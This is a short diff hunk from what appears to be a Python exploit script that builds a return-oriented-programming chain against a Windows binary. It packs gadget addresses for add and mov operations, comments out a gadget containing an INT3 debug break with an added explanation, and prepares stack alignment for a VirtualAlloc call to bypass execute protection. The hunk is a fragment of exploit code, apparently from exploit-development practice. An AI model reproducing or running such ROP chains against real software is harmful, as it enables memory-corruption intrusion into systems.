@@ -178,6 +178,11 @@ rop += pack("<L", (0x7F7F7FC0))  # second value to be added
 rop += pack("<L", (0x5051579A))  # add eax, ecx ; ret
 rop += pack("<L", (0x5051CBB6))  # mov dword [esi], eax ; ret
 # rop += pack("<L", (0x50549417))  # push eax ; call esi      <- problem section
+# reason: gadget was INT3; PUSH EAX; CALL ESI
+#         only the INT3 was critical, not the rest
+#         therefore the entire gadget can be removed
+#         when not debugging
+
 
 # Align stack for VirtualAlloc Exec
 # bp 0x5050118e ".if @eax = 0x40 {} .else {gc}"
